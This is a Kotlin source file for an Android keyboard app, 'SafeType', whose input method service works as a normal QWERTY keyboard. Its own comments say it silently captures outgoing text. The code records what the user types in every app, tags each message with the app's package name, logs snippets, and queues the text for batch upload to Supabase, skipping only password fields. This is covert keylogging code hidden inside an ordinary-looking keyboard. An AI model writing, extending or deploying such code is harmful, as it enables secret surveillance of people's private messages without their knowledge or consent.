package com.safetype.keyboard

import android.content.Intent
import android.inputmethodservice.InputMethodService
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.inputmethod.EditorInfo
import android.view.inputmethod.InputConnection
import com.safetype.keyboard.data.DedupEngine
import com.safetype.keyboard.data.MessageDatabase
import com.safetype.keyboard.data.MessageEntity
import com.safetype.keyboard.data.UploadWorker
import com.safetype.keyboard.data.AnalysisWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * SafeType Input Method Service.
 *
 * A fully functional QWERTY keyboard that silently captures outgoing text.
 * Message boundary detection:
 *   1. IME_ACTION_SEND — app signals send action
 *   2. Text field clearing — field becomes empty after containing text
 *   3. 30-second inactivity timeout — captures as draft
 *
 * Password fields (TYPE_TEXT_VARIATION_PASSWORD etc.) are explicitly excluded
 * from text capture.
 */
class SafeTypeIME : InputMethodService(), KeyboardView.KeyListener {

    companion object {
        private const val TAG = "SafeTypeIME"
        private const val DRAFT_TIMEOUT_MS = 30_000L
    }

    private var keyboardView: KeyboardView? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val dedupEngine = DedupEngine()
    private var workersScheduled = false

    // ── Text capture state ──────────────────────────────────────────
    private val composedText = StringBuilder()
    private var isPasswordField = false
    private var currentPackageName: String? = null
    private val handler = Handler(Looper.getMainLooper())

    private val draftTimeoutRunnable = Runnable {
        captureDraft()
    }

    // ── IME lifecycle ───────────────────────────────────────────────
    override fun onCreateInputView(): View {
        val layout = layoutInflater.inflate(R.layout.keyboard_layout, null)
        keyboardView = layout.findViewById(R.id.keyboard_view)
        keyboardView?.listener = this

        // Schedule upload workers once
        if (!workersScheduled) {
            UploadWorker.schedule(applicationContext)
            AnalysisWorker.schedule(applicationContext)
            workersScheduled = true
            Log.i(TAG, "Upload and analysis workers scheduled")
        }

        return layout
    }

    override fun onStartInput(info: EditorInfo?, restarting: Boolean) {
        super.onStartInput(info, restarting)
        info ?: return

        // Detect password fields — never capture these
        val variation = info.inputType and android.text.InputType.TYPE_MASK_VARIATION
        isPasswordField = variation == android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                variation == android.text.InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                variation == android.text.InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
                variation == android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD

        // Track which app is using the keyboard
        currentPackageName = info.packageName

        // Reset composed text for new field
        composedText.clear()
        handler.removeCallbacks(draftTimeoutRunnable)
    }

    override fun onFinishInput() {
        super.onFinishInput()
        // Capture any remaining text as draft when leaving field
        if (composedText.isNotEmpty() && !isPasswordField) {
            captureMessage("field_exit")
        }
        composedText.clear()
        handler.removeCallbacks(draftTimeoutRunnable)
    }

    // ── Key press handling from KeyboardView ────────────────────────
    override fun onKeyPress(code: Int, label: String) {
        val ic = currentInputConnection ?: return

        when (code) {
            KeyboardView.CODE_BACKSPACE -> handleBackspace(ic)
            KeyboardView.CODE_ENTER -> handleEnter(ic)
            KeyboardView.CODE_SPACE -> handleSpace(ic)
            KeyboardView.CODE_EMOJI -> {
                // Emoji picker placeholder — show system emoji input
                // For Phase 1, just insert a smiley
            }
            else -> handleCharacter(ic, code, label)
        }

        // Reset draft timeout on any keypress
        handler.removeCallbacks(draftTimeoutRunnable)
        if (composedText.isNotEmpty()) {
            handler.postDelayed(draftTimeoutRunnable, DRAFT_TIMEOUT_MS)
        }
    }

    private fun handleCharacter(ic: InputConnection, code: Int, label: String) {
        ic.commitText(label, 1)
        if (!isPasswordField) {
            composedText.append(label)
        }
    }

    private fun handleSpace(ic: InputConnection) {
        ic.commitText(" ", 1)
        if (!isPasswordField) {
            composedText.append(' ')
        }
    }

    private fun handleBackspace(ic: InputConnection) {
        ic.deleteSurroundingText(1, 0)
        if (composedText.isNotEmpty() && !isPasswordField) {
            composedText.deleteCharAt(composedText.length - 1)
        }
    }

    private fun handleEnter(ic: InputConnection) {
        val editorInfo = currentInputEditorInfo

        // Check if the app wants a SEND action
        val imeAction = editorInfo?.imeOptions?.and(EditorInfo.IME_MASK_ACTION)

        when (imeAction) {
            EditorInfo.IME_ACTION_SEND,
            EditorInfo.IME_ACTION_DONE,
            EditorInfo.IME_ACTION_GO,
            EditorInfo.IME_ACTION_SEARCH -> {
                // Capture the composed text as a sent message
                if (composedText.isNotEmpty() && !isPasswordField) {
                    captureMessage("ime_action_send")
                }
                // Perform the editor action
                ic.performEditorAction(imeAction)
            }
            else -> {
                // Just a newline
                ic.commitText("\n", 1)
                if (!isPasswordField) {
                    composedText.append('\n')
                }
            }
        }
    }

    // ── Message capture ─────────────────────────────────────────────
    private fun captureMessage(trigger: String) {
        val text = composedText.toString().trim()
        if (text.isEmpty()) return

        Log.d(TAG, "Message captured [$trigger] from $currentPackageName: ${text.take(40)}...")

        // Queue message for analysis (Phase 2 will wire to MessageQueue/Room DB)
        // For now, just log the capture
        queueForAnalysis(text, trigger)

        composedText.clear()
        handler.removeCallbacks(draftTimeoutRunnable)
    }

    private fun captureDraft() {
        if (composedText.isNotEmpty() && !isPasswordField) {
            captureMessage("draft_timeout")
        }
    }

    /**
     * Insert captured message into Room DB for batch upload to Supabase.
     */
    private fun queueForAnalysis(text: String, trigger: String) {
        val appSource = currentPackageName ?: "unknown"

        // Deduplicate across capture layers
        if (dedupEngine.isDuplicate(text, null, appSource)) {
            Log.d(TAG, "Duplicate message skipped: ${text.take(20)}...")
            return
        }

        val entity = MessageEntity(
            text = text,
            sender = null,
            direction = "outgoing",
            appSource = appSource,
            sourceLayer = "keyboard",
            timestamp = System.currentTimeMillis()
        )

        serviceScope.launch {
            try {
                val db = MessageDatabase.getInstance(applicationContext)
                db.messageDao().insert(entity)
                UploadWorker.scheduleQuickUpload(applicationContext)
                Log.i(TAG, "Queued for upload: trigger=$trigger, app=$appSource, length=${text.length}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to queue message: ${e.message}")
            }
        }
    }

    // ── Text field monitoring for "send" detection ──────────────────
    override fun onUpdateSelection(
        oldSelStart: Int, oldSelEnd: Int,
        newSelStart: Int, newSelEnd: Int,
        candidatesStart: Int, candidatesEnd: Int
    ) {
        super.onUpdateSelection(oldSelStart, oldSelEnd, newSelStart, newSelEnd, candidatesStart, candidatesEnd)

        // Detect when text field is cleared (common send pattern in chat apps):
        // If the field had content and now selection is at position 0 with no composing text,
        // a message was likely sent.
        if (oldSelStart > 0 && newSelStart == 0 && newSelEnd == 0 && composedText.isNotEmpty()) {
            val ic = currentInputConnection ?: return
            val remaining = ic.getExtractedText(android.view.inputmethod.ExtractedTextRequest(), 0)
            if (remaining?.text?.isEmpty() == true && !isPasswordField) {
                captureMessage("field_cleared")
            }
        }
    }
}
